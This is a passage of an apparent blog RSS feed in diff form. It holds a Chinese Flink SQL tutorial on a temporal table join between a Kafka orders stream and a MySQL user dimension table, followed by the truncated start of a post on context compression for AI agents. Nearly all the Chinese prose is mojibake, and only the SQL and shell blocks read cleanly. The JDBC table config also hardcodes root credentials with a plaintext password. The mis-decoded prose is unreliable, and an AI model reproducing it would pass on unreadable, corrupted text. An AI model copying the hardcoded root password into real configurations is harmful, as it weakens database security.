+<li>ç¨æ·å½åçç­çº§ãåå¸ãæ¸ é</li>
+<li>ååæå±åç±»ãç±»ç®å±çº§</li>
+</ul>
+<p>è¿äºä¿¡æ¯éå¸¸å­æ¾å¨ <strong>ç»´åº¦è¡¨</strong>ï¼ç»´è¡¨ï¼ä¸­ï¼ä¾å¦ MySQL ç <code>dim_user</code>ã<code>dim_product</code> ç­ãæä»¬å¸æå¨å®æ¶è®¡ç®æ¶ï¼è½æãäºå®æµãåãç»´è¡¨ãå¨æ¶é´ç»´åº¦ä¸æ­£ç¡®å°å³èèµ·æ¥ï¼æå»ºä¸å¼ å¸¦æå®æ´ä¸å¡å±æ§ç<strong>æç»å®½è¡¨</strong>ã</p>
+<p>è¿å°±æ¯ <strong>ç»´è¡¨æ¶æ Joinï¼Temporal Table Joinï¼</strong> è¦è§£å³çé®é¢ã</p>
+<p>æ¬ææä»¬å°±ä»¥ãè®¢åäºå®æµ + ç¨æ·ç»´è¡¨ãä¸ºä¾ï¼å®æä¸ä¸ªä» Kafka å° MySQL çç®æå®æ¶æ°ä» Demoï¼å¹¶éç¹çè§£ Flink SQL ä¸­ç»´è¡¨æ¶æ Join çè¯­æ³åæ³¨æäºé¡¹ã</p>
+<h2 id="ä¸ä¸å¡åºæ¯ä¸æ°ä»ç®æ ">ä¸ãä¸å¡åºæ¯ä¸æ°ä»ç®æ </h2>
+<p>è®¾æ³ä¸ä¸ªç®åççµåä¸å¡åºæ¯ï¼</p>
+<ul>
+<li>Kafka ä¸­æå®æ¶åå¥ç <code>orders</code> è®¢åäºå®æµ</li>
+<li>MySQL ä¸­ç»´æ¤ä¸å¼  <code>dim_user</code> ç¨æ·ç»´è¡¨ï¼åå«ç¨æ·ç­çº§ãæå±åå¸ãæ³¨åæ¸ éç­ä¿¡æ¯</li>
+</ul>
+<p>æä»¬æ³è¦å¨ Flink ä¸­æå»ºä¸å¼ ã<strong>è®¢åæç»å®½è¡¨</strong>ãï¼å­æ®µå¤§è´åæ¬ï¼</p>
+<ul>
+<li>è®¢åä¿¡æ¯ï¼è®¢åå·ãä¸åç¨æ·ãä¸åéé¢ãä¸åæ¶é´</li>
+<li>ç¨æ·å±æ§ï¼ç¨æ·æµç§°ãç­çº§ãåå¸ãæ³¨åæ¸ é</li>
+</ul>
+<p>å¹¶ä¸è¦æ±ï¼</p>
+<ul>
+<li>å½æä»¬åç 10 åéåçææ¡è®¢åæ¶ï¼çå°çæ¯ <strong>å½æ¶</strong> ç¨æ·çç­çº§ååå¸ï¼èä¸æ¯è¢«åç»­åæ´âå²æâçææ°å¼</li>
+</ul>
+<p>è¿æ­£æ¯ <strong>æ¶æ Join</strong> åãå®æ¶æ°ä»ãçå³é®ï¼<strong>æäºä»¶åçæ¶å»åæ¾ç»´åº¦è§å¾</strong>ã</p>
+<h2 id="äºç¯å¢åæä¸ä¾èµåå¤">äºãç¯å¢åæä¸ä¾èµåå¤</h2>
+<h3 id="1-åºç¡ç»ä»¶">1. åºç¡ç»ä»¶</h3>
+<p>æ¬ç¯é»è®¤ä½ å·²ç»å®æåå ç¯ä¸­çç¯å¢åå¤ï¼</p>
+<ul>
+<li>Flink 1.20.1ï¼WSL2 Ubuntu ä¸é¨ç½²ï¼</li>
+<li>Kafka éç¾¤å·²å¯å¨ï¼ä¸è½æ­£å¸¸åå¥ / è¯»å Topic</li>
+<li>Flink SQL Client å¯ä»¥æ­£å¸¸è¿æ¥éç¾¤</li>
+</ul>
+<p>å¨æ­¤åºç¡ä¸ï¼æä»¬è¿éè¦ï¼</p>
+<ul>
+<li>ä¸å¥å¯è®¿é®ç MySQLï¼æ¬å°æè¿ç¨åå¯ï¼</li>
+<li>Flink ç JDBC Connector JAR å</li>
+</ul>
+<h3 id="2-å®è£-flink-jdbc-connector">2. å®è£ Flink JDBC Connector</h3>
+<p>å Kafka ä¸æ ·ï¼JDBC è¿æ¥å¨ä¹éè¦ä»¥ JAR åå½¢å¼æ¾å° Flink ç <code>lib</code> ç®å½ä¸­ã</p>
+<p>ä»¥ Flink 1.20.x å¯¹åºç <code>flink-connector-jdbc</code> ä¸ºä¾ï¼</p>
+<ol>
+<li>
+<p>ç¡®è®¤ Flink å®è£ç®å½ï¼åè®¾ä¸º <code>/opt/flink</code>ï¼ï¼</p>
+<pre><code class="language-bash">export FLINK_HOME=/opt/flink
+</code></pre>
+</li>
+<li>
+<p>ä¸è½½ JDBC Connector JAR å° Flink ç <code>lib</code> ç®å½ï¼</p>
+<pre><code class="language-bash">cd $FLINK_HOME/lib
+wget https://repo1.maven.org/maven2/org/apache/flink/flink-connector-jdbc/3.3.0-1.20/flink-connector-jdbc-3.3.0-1.20.jar
+</code></pre>
+</li>
+<li>
+<p>å¦æä½ ä½¿ç¨çæ¯ç¬ç«éç¾¤æè¿ç¨éç¾¤ï¼éè¦éå¯ Flink éç¾¤ï¼è®©æ° JAR å¨ JobManager/TaskManager ä¸çæï¼</p>
+<pre><code class="language-bash">cd $FLINK_HOME
+bin/stop-cluster.sh
+bin/start-cluster.sh
+</code></pre>
+</li>
+<li>
+<p>éå¯ Flink SQL Clientï¼ä½¿ç¨æ° Connectorï¼</p>
+<pre><code class="language-bash">cd $FLINK_HOME
+bin/sql-client.sh
+</code></pre>
+</li>
+</ol>
+<p>å¦æä½ å¨ Windows + WSL2 ä¸é¨ç½²ï¼åªéå¨ WSL2 åæ§è¡ä¸è¿°å½ä»¤å³å¯ï¼æèæå¨ä¸è½½ JAR åæ·è´å° <code>lib</code> ç®å½ï¼æ­¥éª¤å®å¨ä¸è´ã</p>
+<h2 id="ä¸åå¤-mysql-ç¨æ·ç»´åº¦è¡¨-dim_user">ä¸ãåå¤ MySQL ç¨æ·ç»´åº¦è¡¨ dim_user</h2>
+<p>é¦åå¨ MySQL ä¸­åå¤ä¸å¼ ç®åçç¨æ·ç»´åº¦è¡¨ï¼ç¨æ¥å­ç¨æ·çåºç¡å±æ§ã</p>
+<p>å¨ MySQL ä¸­æ§è¡ï¼</p>
+<pre><code class="language-sql">CREATE DATABASE IF NOT EXISTS realtime_dwh;
+USE realtime_dwh;
+
+CREATE TABLE dim_user (
+  user_id      VARCHAR(32)  PRIMARY KEY,
+  user_name    VARCHAR(64),
+  user_level   VARCHAR(16),
+  city         VARCHAR(64),
+  register_time DATETIME
+);
+
+INSERT INTO dim_user (user_id, user_name, user_level, city, register_time) VALUES
+('u_1', 'å¼ ä¸', 'VIP1', 'åäº¬', '2025-12-01 10:00:00'),
+('u_2', 'æå', 'VIP2', 'ä¸æµ·', '2025-12-05 11:00:00'),
+('u_3', 'çäº', 'VIP1', 'å¹¿å·', '2025-12-10 12:00:00');
+</code></pre>
+<p>ä¸ºäºæ¼ç¤ºãæ¶æãææï¼ä½ å¯ä»¥å¨åç»­å®éªä¸­æå¨æ´æ°æä¸ªç¨æ·çç­çº§æåå¸ï¼ä¾å¦ï¼</p>
+<pre><code class="language-sql">UPDATE dim_user
+SET user_level = 'VIP3'
+WHERE user_id = 'u_2';
+</code></pre>
+<p>è¿æ ·æä»¬å¨ Flink éåæ¶æ Join æ¶ï¼å°±è½è§å¯âåæ´ååâçåºå«ã</p>
+<h2 id="åå¨-flink-ä¸­æ³¨åäºå®æµä¸ç»´è¡¨">åãå¨ Flink ä¸­æ³¨åäºå®æµä¸ç»´è¡¨</h2>
+<p>æ¥ä¸æ¥åå° Flink SQL Clientï¼æ Kafka ä¸­çè®¢åäºå®æµå MySQL ä¸­çç»´è¡¨é½æ³¨åæ Flink è¡¨ã</p>
+<h3 id="1-kafka-è®¢åäºå®è¡¨-orders">1. Kafka è®¢åäºå®è¡¨ orders</h3>
+<p>åä¸ä¸ç¯åæµ JOIN ç±»ä¼¼ï¼æä»¬åè®¾ Kafka ä¸­æä¸ä¸ª <code>orders</code> Topicï¼åå¥è®¢åäºå®æ°æ®ã</p>
+<p>å¨ Flink SQL Client ä¸­æ§è¡ï¼</p>
+<pre><code class="language-sql">CREATE TABLE orders (
+  order_id     STRING,
+  user_id      STRING,
+  order_amount DECIMAL(10, 2),
+  order_time   TIMESTAMP_LTZ(3),
+  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND,
+  proc_time AS PROCTIME()
+) WITH (
+  'connector' = 'kafka',
+  'topic' = 'orders',
+  'properties.bootstrap.servers' = '127.0.0.1:9092',
+  'properties.group.id' = 'flink-orders-dim',
+  'scan.startup.mode' = 'earliest-offset',
+  'format' = 'json',
+  'json.timestamp-format.standard' = 'ISO-8601'
+);
+</code></pre>
+<p>ä½ å¯ä»¥æ²¿ç¨ä¸ä¸ç¯ä¸­ Kafka é æ°çæ¹å¼ï¼ç¨ <code>kafka-console-producer.sh</code> åé JSON è®¢åæ°æ®ï¼åªéè¦ä¿è¯å­æ®µåä¸è´ã</p>
+<h3 id="2-mysql-ç¨æ·ç»´è¡¨-dim_userjdbc-lookup-è¡¨">2. MySQL ç¨æ·ç»´è¡¨ dim_userï¼JDBC Lookup è¡¨ï¼</h3>
+<p>ç¶åæåæå¨ MySQL ä¸­å»ºå¥½ç <code>dim_user</code> æ³¨åä¸º Flink ç JDBC è¡¨ï¼</p>
+<pre><code class="language-sql">CREATE TABLE dim_user (
+  user_id       STRING,
+  user_name     STRING,
+  user_level    STRING,
+  city          STRING,
+  register_time TIMESTAMP(3),
+  PRIMARY KEY (user_id) NOT ENFORCED
+) WITH (
+  'connector' = 'jdbc',
+  'url' = 'jdbc:mysql://127.0.0.1:3306/realtime_dwh',
+  'table-name' = 'dim_user',
+  'driver' = 'com.mysql.cj.jdbc.Driver',
+  'username' = 'root',
+  'password' = '1qaz@WSX'
+);
+</code></pre>
+<p>æ³¨æå ç¹ï¼</p>
+<ul>
+<li><code>PRIMARY KEY (user_id) NOT ENFORCED</code> åè¯ Flink è¿æ¯ä¸å¼ ä»¥ <code>user_id</code> ä¸ºä¸»é®çè¡¨ï¼æ¯åæ¶æ Join çåæ</li>
+<li>è¿éä½¿ç¨çæ¯å¸åç JDBC Lookup æ¨¡å¼ï¼Flink ä¼å¨ Join æ¶æéå» MySQL æ¥ç»´åº¦ä¿¡æ¯</li>
+</ul>
+<p>å¨çäº§ç¯å¢ä¸­ï¼ä½ å¯ä»¥æ MySQL ä½ä¸ºç»´åº¦å­å¨ï¼æèéè¿ CDC æç»´è¡¨åæ´åæ­¥å° Kafkaï¼æé æ changelog æµï¼è¿äºé½å¯ä»¥å Temporal Join ç»åä½¿ç¨ã</p>
+<h2 id="äºç»´è¡¨æ¶æ-joinæè®¢åæä¸ç¨æ·ç»´åº¦">äºãç»´è¡¨æ¶æ Joinï¼æè®¢åæä¸ç¨æ·ç»´åº¦</h2>
+<p>æäºè®¢åäºå®è¡¨ <code>orders</code> åç»´åº¦è¡¨ <code>dim_user</code>ï¼å°±å¯ä»¥éè¿æ¶æ Join æ¥æå»ºè®¢åæç»å®½è¡¨ã</p>
+<h3 id="1-åºç¡æ¶æ-join-è¯­æ³">1. åºç¡æ¶æ Join è¯­æ³</h3>
+<p>Flink SQL ä¸­ç Temporal Table Join å¯¹äº JDBC è¿ç±» <strong>å¤é¨ç»´è¡¨</strong>ï¼éå¸¸éç¨ãå¤çæ¶é´ï¼Processing Timeï¼ãè¯­ä¹æ¥å Lookup Joinï¼å¸ååæ³å¦ä¸ï¼</p>
+<pre><code class="language-sql">SELECT
+  o.order_id,
+  o.user_id,
+  d.user_name,
+  d.user_level,
+  d.city,
+  o.order_amount,
+  o.order_time
+FROM orders AS o
+LEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d
+ON o.user_id = d.user_id;
+</code></pre>
+<p><img alt="FlinkJoin" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260219125508288-1508486548.png" class="lazyload"><br>
+è¿éæå ä¸ªå³é®ç¹ï¼</p>
+<ul>
+<li><code>proc_time AS PROCTIME()</code> æ¯å¨ <code>orders</code> ä¸å®ä¹çå¤çæ¶é´å­æ®µ</li>
+<li><code>FOR SYSTEM_TIME AS OF o.proc_time</code> è¡¨ç¤ºâä»¥ Flink å¤çè¿æ¡è®¢åè®°å½çå½åæ¶é´ï¼å»æ¥ç»´è¡¨çä¸ä¸ªå¿«ç§âï¼è¿æ¯ JDBC Lookup æ¯æçå¸åç¨æ³</li>
+<li>Join æ¡ä»¶ä¾ç¶æ¯ <code>user_id</code> ç­å¼å³è</li>
+<li>ä½¿ç¨ <code>LEFT JOIN</code> å¯ä»¥ä¿çæ¾ä¸å°ç»´åº¦çè®¢åï¼å¹¶ç¨ç©ºå¼æ¥è¡¨ç¤ºâç»´åº¦ç¼ºå¤±â</li>
+</ul>
+<p>å¨ SQL Client ä¸­æ§è¡è¿æ®µæ¥è¯¢ï¼ä¼çå°å®æ¶æµå¼å·æ°çç»æï¼æ¯ä¸è¡è®¢åé½å¸¦ä¸äºå¯¹åºçç¨æ·å±æ§ã</p>
+<h3 id="2-éªè¯æ¶æææä¿®æ¹ç»´è¡¨åè§å¯-join">2. éªè¯æ¶æææï¼ä¿®æ¹ç»´è¡¨åè§å¯ Join</h3>
+<p>ä¸ºäºéªè¯è¿æ¯âæ¶æ Joinâèä¸æ¯âå§ç»æ¥ææ°ç»´åº¦âï¼å¯ä»¥æä¸é¢æ­¥éª¤æä½ï¼</p>
+<ol>
+<li>
+<p>åå¾ Kafka ç <code>orders</code> Topic åå¥å æ¡è®¢åæ°æ®ï¼ä¾å¦ç¨æ· <code>u_2</code> ä¸åçè®°å½</p>
+</li>
+<li>
+<p>è§å¯ Flink SQL ä¸­ Join åçç»æï¼æ­¤æ¶ <code>u_2</code> çç­çº§æ¯ <code>VIP2</code></p>
+</li>
+<li>
+<p>åå° MySQLï¼æ§è¡ï¼</p>
+<pre><code class="language-sql">UPDATE dim_user
+SET user_level = 'VIP3'
+WHERE user_id = 'u_2';
+</code></pre>
+</li>
+<li>
+<p>ååå¥ä¸æ¹æ°çè®¢åï¼ä»ç¶æ¯ç¨æ· <code>u_2</code></p>
+</li>
+</ol>
+<pre><code class="language-bash">bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic orders
+</code></pre>
+<p>å¨å½ä»¤è¡ä¸­è¾å¥ä¸æ¡ JSON æ°æ®ï¼æåè½¦åéä¸æ¡ï¼ï¼</p>
+<pre><code class="language-json">{"order_id":"o_3","user_id":"u_2","order_amount":200.00,"order_time":"2026-02-19T14:42:00Z"}
+</code></pre>
+<p><img alt="FlinkJoin" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260219125508267-1292715641.png" class="lazyload"><br>
+è¿æ¶ä½ ä¼çå°ï¼</p>
+<ul>
+<li>åæ´åçè®¢åï¼ç»´åº¦å­æ®µä»ç¶æ¾ç¤º <code>VIP2</code></li>
+<li>åæ´åçè®¢åï¼ç»´åº¦å­æ®µåæäº <code>VIP3</code></li>
+</ul>
+<p>è¿å°±è¯´æ Flink çæ¶æ Join ç¡®å®æ¯âæè®¢ååçæ¶å»å»åæ¾ç»´åº¦è§å¾âçï¼èä¸æ¯ç®åæ¥å½åææ°å¼ã</p>
+<h2 id="å­æç»æåå-kafka-æ-mysqlå½¢æå®æ¶æ°ä»æç»å±">å­ãæç»æåå Kafka æ MySQLï¼å½¢æå®æ¶æ°ä»æç»å±</h2>
+<p>å¨çå®é¡¹ç®ä¸­ï¼æä»¬ä¸ä¼åªå¨ SQL Client é <code>SELECT</code> ä¸ä¸å°±ç»æï¼èæ¯è¦æ Join åçè®¢åæç»å®½è¡¨ï¼ååå°ä¸æ¸¸å­å¨ï¼å½¢æå®æ¶æ°ä»çä¸ä¸ªå±çº§ã</p>
+<p>ä¾å¦ï¼å¯ä»¥æç»æåå Kafkaï¼ä½ä¸º DWD å±çè®¢åå®½è¡¨ï¼</p>
+<pre><code class="language-sql">CREATE TABLE dwd_order_user_wide (
+  order_id     STRING,
+  user_id      STRING,
+  user_name    STRING,
+  user_level   STRING,
+  city         STRING,
+  order_amount DECIMAL(10, 2),
+  order_time   TIMESTAMP_LTZ(3),
+  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND
+) WITH (
+  'connector' = 'kafka',
+  'topic' = 'dwd_order_user_wide',
+  'properties.bootstrap.servers' = '127.0.0.1:9092',
+  'properties.group.id' = 'flink-dwd-order-wide',
+  'scan.startup.mode' = 'earliest-offset',
+  'format' = 'json',
+  'json.timestamp-format.standard' = 'ISO-8601'
+);
+
+INSERT INTO dwd_order_user_wide
+SELECT
+  o.order_id,
+  o.user_id,
+  d.user_name,
+  d.user_level,
+  d.city,
+  o.order_amount,
+  o.order_time
+FROM orders AS o
+LEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d
+ON o.user_id = d.user_id;
+</code></pre>
+<p>è¿æ ·ï¼ä¸æ¸¸çå®æ¶åºç¨æ BI æ¥è¯¢å°±å¯ä»¥ç´æ¥è®¢é <code>dwd_order_user_wide</code> è¿ä¸ª Topicï¼æ¿å°å·²ç»æå¥½ç¨æ·æ ç­¾çè®¢åæç»æ°æ®ã</p>
+<p>ä½ ä¹å¯ä»¥æç»æåæ­¥å° MySQLãClickHouse ç­åæåæ°æ®åºä¸­ï¼æå»ºå®æ¶æç»è¡¨ï¼ä¸ºæ¥è¡¨åå¯è§åæä¾æ°æ®ã</p>
+<h2 id="ä¸å°ç»ä¸ä¸ä¸æ­¥å»ºè®®">ä¸ãå°ç»ä¸ä¸ä¸æ­¥å»ºè®®</h2>
+<p>éè¿è¿ç¯æç« ï¼æä»¬å®æäºè¿æ ·ä¸ä»¶äºï¼</p>
+<ul>
+<li>å¨ Kafka ä¸­ç»´æ¤è®¢åäºå®æµ <code>orders</code></li>
+<li>å¨ MySQL ä¸­ç»´æ¤ç¨æ·ç»´åº¦è¡¨ <code>dim_user</code></li>
+<li>ä½¿ç¨ Flink SQL ç JDBC Connector æ MySQL æ³¨åä¸ºç»´è¡¨</li>
+<li>å©ç¨ <code>FOR SYSTEM_TIME AS OF</code> è¯­æ³åç»´è¡¨æ¶æ Join</li>
+<li>å° Join ç»æåå Kafkaï¼å½¢æå®æ¶æ°ä»ä¸­çä¸å¼ è®¢åæç»å®½è¡¨</li>
+</ul>
+<p>è¿èåæå ä¸ªéå¸¸éè¦çå®æ¶æ°ä»è®¾è®¡çå¿µï¼</p>
+<ul>
+<li>äºå®æµæ¯ä¸æ­è¿½å çäºä»¶åºåï¼ç»´è¡¨æ¯ç¸å¯¹ç¼æ¢åæ´çä¸å¡è§å¾</li>
+<li>æ¶æ Join è®©ä½ è½å¤âæäºä»¶åççæ¶é´ç¹âï¼åçå½æ¶çç»´åº¦å¿«ç§</li>
+<li>å®æ¶æ°ä»ç DWD å±ï¼å¾å¾å°±æ¯ãäºå®è¡¨ + å¤ä¸ªç»´è¡¨æ¶æ Joinãåå½¢æçæç»å®½è¡¨</li>
+</ul>
+<p>å¨åç»­çæç« ä¸­ï¼æä»¬å¯ä»¥ç»§ç»­æ²¿çè¿ä¸ªæ¹åæ·±å¥ï¼</p>
+<ul>
+<li>å¨ä¸ä¸ªä»»å¡éåæ¶å³èå¤å¼ ç»´è¡¨ï¼æå»ºæ´å®½çæç»è¡¨</li>
+<li>å¼å¥ CDCï¼æç»´è¡¨åæ´å®æ¶åæ­¥å° Kafkaï¼åå¨ Flink ä¸­æå»º changelog ç»´è¡¨</li>
+<li>æå®æ¶æ°ä»çæç»å±ãæ±æ»å±ï¼DWSï¼ãææ ä¸»é¢å±ï¼ADSï¼ä¸²èµ·æ¥ï¼åä¸ä¸ªç«¯å°ç«¯çå®æ¶æ°ä»å°é¡¹ç®</li>
+</ul>
+<p>å¦æä½ å·²ç»è·éäºæ¬æç Demoï¼ä¸å¦¨è¯çèªå·±è®¾è®¡ä¸å¼ ååç»´è¡¨ <code>dim_product</code>ï¼åç»è®¢åæä¸åååç±»ç»´åº¦ï¼ä½éªä¸ä¸âäºå® + å¤ç»´è¡¨æ¶æ Joinâå¨ Flink SQL éçå®æ´å³éã</p>
+<hr>
+<p><a href="http://blog.daimajiangxin.com.cn" target="_blank" rel="noopener nofollow">åææ¥èª:http://blog.daimajiangxin.com.cn</a></p>
+
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0.04027777777777778" data-date-updated="2026-02-19 13:56">2026-02-19 12:58</span>&nbsp;
+<a href="https://www.cnblogs.com/daimajiangxin">ä»£ç å å¿</a>&nbsp;
+éè¯»(<span id="post_view_count">70</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19624638);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19624638', targetLink: 'https://www.cnblogs.com/daimajiangxin/p/19624638', title: 'ä»é¶å¼å§å­¦Flinkï¼å®æ¶æ°ä»ä¸ç»´è¡¨æ¶æJoinå®æ' })">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ èµäº AI Agent âæ éç»­èªâï¼è¯­ä¹ä¿æ¤åä¸ä¸æåç¼©ææ¯è§£æ ]]></title>
+    <link>https://www.cnblogs.com/noear/p/19624614</link>
+    <guid>6da46199617d5b2ddb442ec7cc90316e</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/noear/p/19624614" title="åå¸äº 2026-02-19 12:21">
+    <span role="heading" aria-level="2">èµäº AI Agent âæ éç»­èªâï¼è¯­ä¹ä¿æ¤åä¸ä¸æåç¼©ææ¯è§£æ</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        Solon AIæ¡æ¶çSummarizationInterceptoråæ°æ§å°è§£å³äºAIé¿å¯¹è¯ä¸­ç"ä¸ä¸æçªå£çç¸"é®é¢ãè¿å¥æºè½è®°å¿ç®¡çç³»ç»éè¿åæ­¥ç­ç¥ï¼éå®æ ¸å¿ä»»å¡æä»¤ãç¡®ä¿è¡å¨-ç»æå®æ´æ§ãä¿æè¯­ä¹è¿è´¯æ§ãæ·»å ç³»ç»æç¤ºï¼å®ç°äºä¼éçè®°å¿åç¼©ãå¶éç¨æä»¶å¼è®¾è®¡ï¼æ¯æå±çº§åç¼©ãå³é®ä¿¡æ¯æåååéåºå½æ¡£ç­ç­ç¥ç»åï¼è®©AIæ¢è½è®°ä½æ ¸å¿ç®æ ï¼åè½å¤çè¶é¿ä»»å¡ãè¿ç§"æé»è¾å°éå¿"æºå¶ï¼ææé¿åäºä¼ ç»ç²æ´è£åªå¯¼è´çé»è¾æ··ä¹±ï¼ä¸ºAIå¤çå¤æä»»å¡æä¾äº"æ éç»­èª"
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>æ³è±¡ä¸ä¸ï¼ä½ æ­£å¨ææ¥ä¸ä¸ªè¶çº§èªæçAIå©æï¼æä»¬ç§°ä¹ä¸ºAgentï¼å¸®ä½ å®æä¸é¡¹å¤æä»»å¡ï¼æ¯å¦ç­åä¸æ¬¡è·¨å½æè¡ãä¸å¼å§ï¼å®è®°å¾ä½ çææè¦æ±ï¼æ³å»åªäºå½å®¶ãé¢ç®å¤å°ãåæ¬¢ä»ä¹ç±»åçéåºãä½éçä»»å¡çè¿è¡ï¼å®éè¦æ¥è¯¢èªç­ãæ¯è¾éåºãæ¥çå¤©æ°â¦â¦æ¯ä¸æ¬¡æ¥è¯¢åæèé½ä¼å¢å å®çâè®°å¿è´æâã</p>
+<p>å¦æå®âè®°æ§âä¸å¥½ï¼èå°ä¸åå°±ä¼å¿äºæå¼å§çè¦æ±ï¼æèé·å¥æ··ä¹±çé»è¾ä¸­ï¼è¿å°±æ¯å¼åèå¸¸è¯´çâä¸ä¸æçªå£çç¸âé®é¢ã</p>
+<p>Solon AI æ¡æ¶éæä¸ä¸ªç§å¯æ­¦å¨ââ<code>SummarizationInterceptor</code>ï¼æºè½è®°å¿åç¼©å¨ï¼ï¼å®è½è®©AIå©æåäººä¸æ ·ï¼<strong>æ¢ä¸ä¼å¿è®°åå¿ï¼åè½è½»è£ä¸éµï¼å®ç°çæ­£çâæ éç»­èªâ</strong>ãå®ä¸æ¯ç®åç²æ´å°âæ­çâï¼èæ¯ä¸å¥ä¼éçâè®°å¿ç®¡çå¤§å¸âã</p>
+<h3 id="1ä¸ºä»ä¹ä¸è½ç®åç²æ´å°æ­ç">1ãä¸ºä»ä¹ä¸è½ç®åç²æ´å°âæ­çâï¼</h3>
+<p>å¤çé¿å¯¹è¯ï¼æç´æ¥çæ³æ³æ¯ï¼å¯¹è¯å¤ªé¿ï¼é£å°±å æåé¢ä¸åå§ï¼ä½è¿ç§âæ´åè£åªâå¯¹AIæ¥è¯´ï¼ä¼å¸¦æ¥ä¸¤ä¸ªè´å½ä¼¤ï¼</p>
+<ul>
+<li><strong>å¿æ¬ï¼å¤±å»åå¿ï¼ï¼</strong> AI Agent æå¼å¤´çç³»ç»è®¾å®åä½ äº¤ç»å®çç¬¬ä¸ä¸ªä»»å¡ï¼å¦æè¢«å æï¼å®å°±ä¼åæ å¤´èèä¸æ ·ï¼å®å¨ä¸ç¥éèªå·±è¦å¹²åäºã</li>
+<li><strong>æ­çï¼é»è¾æ­å±ï¼ï¼</strong> AI Agent çå·¥ä½æ¨¡å¼éå¸¸æ¯âæè -&gt; è¡å¨ -&gt; è§å¯ç»æâï¼ReActï¼ãå¦æä½ æ°å¥½æå®çæä¸ªâè¡å¨âåå¯¹åºçâè§å¯ç»æâç»ææ£äºï¼å®çå°ç»æå´ä¸ç¥éä¸ºä»ä¹ä¼æè¿ä¸ªç»æï¼é»è¾ç¬é´æ··ä¹±ï¼çè³é·å¥æ­»å¾ªç¯ï¼æ æ³èªæã</li>
+</ul>
+<p>æä»¥ï¼å¿è®°ä¹æ¯ä¸é¨èºæ¯ï¼éè¦æç­ç¥å°å¿è®°ã</p>
+<h3 id="2æºè½è®°å¿åç¼©å¨æ¯å¦ä½å·¥ä½ç">2ãæºè½è®°å¿åç¼©å¨æ¯å¦ä½å·¥ä½çï¼</h3>
+<p><code>SummarizationInterceptor</code> å°±åä¸ä¸ªèªæçå¾ä¹¦ç®¡çåï¼å®ä¸ä¼éæä¸¢å¼ä¹¦ç±ï¼èæ¯æç§ä¸å¥ç²¾å¯çæµç¨æ¥æ´çä¹¦æ¶ãå®çå·¥ä½åä¸ºåæ­¥ï¼</p>
+<h4 id="ç¬¬ä¸æ­¥éæ­»åå¿éç¹éå®">ç¬¬ä¸æ­¥ï¼éæ­»âåå¿âï¼éç¹éå®ï¼</h4>
+<p>æ è®ºåé¢çå¯¹è¯æå¤é¿ï¼ç®¡çåé½ä¼ç¬¬ä¸æ¶é´æ¾å°ä¸¤æ ·ä¸è¥¿å¹¶æ°¸ä¹ä¿çï¼</p>
+<ul>
+<li><strong>ä»»å¡æä»¤ï¼</strong> ä½ ç¬¬ä¸æ¬¡ç»AIå¸ç½®çä»»å¡ï¼UserMessageï¼ï¼è¿æ¯å®çâåå¿âã</li>
+<li><strong>åºæ¬å®åï¼</strong> AIçç³»ç»è®¾å®ï¼SystemMessageï¼ï¼è¿æ¯å®çâè¡ä¸ºååâã</li>
+</ul>
+<p>è¿ä¸¤æ ·ä¸è¥¿è¢«ç¢ç¢éå®ï¼ç¡®ä¿AIæ°¸ä¸è¿·å¤±æ¹åã</p>
+<h4 id="ç¬¬äºæ­¥ç¦æ­¢æ­çåå­å¯¹é½">ç¬¬äºæ­¥ï¼ç¦æ­¢âæ­çâï¼åå­å¯¹é½ï¼</h4>
+<p>è¿æ¯æ´ä¸ªæºå¶ææ ¸å¿çâé»ç§æâãå½ç®¡çåå³å®è¦æ¸çä¸é¨åæ§åå®¹æ¶ï¼ä»ä¸ä¼ç´æ¥å¨æãä»ä¼ä»ç»æ£æ¥ï¼ç¡®ä¿æ°¸è¿ä¸ä¼æ <strong>âè¡å¨â</strong> å <strong>âç»æâ</strong> è¿å¯¹âè¿ä½å©´å¿âç»ææ£ã</p>
+<ul>
+<li><strong>æºè½æ£æ¥ï¼</strong> å¦æåç°åå¤æ¸ççèµ·ç¹æ­£å¥½è½å¨ä¸ä¸ªâè§å¯ç»æâï¼<code>ToolMessage</code>ï¼æèä¸ä¸ªâè¡å¨æä»¤âï¼<code>AssistantMessage</code>ï¼ä¸ï¼ç®¡çåä¼ç«å»ææ¸çèµ·ç¹ååæªï¼ç´å°ç¡®ä¿æ¯ä¸å¯¹âè¡å¨-ç»æâé½å®æ´å°ä¿çä¸æ¥ã</li>
+</ul>
+<h4 id="ç¬¬ä¸æ­¥è®©è®°å¿æ´è¿è´¯è¯­ä¹è¡¥é½">ç¬¬ä¸æ­¥ï¼è®©è®°å¿æ´è¿è´¯ï¼è¯­ä¹è¡¥é½ï¼</h4>
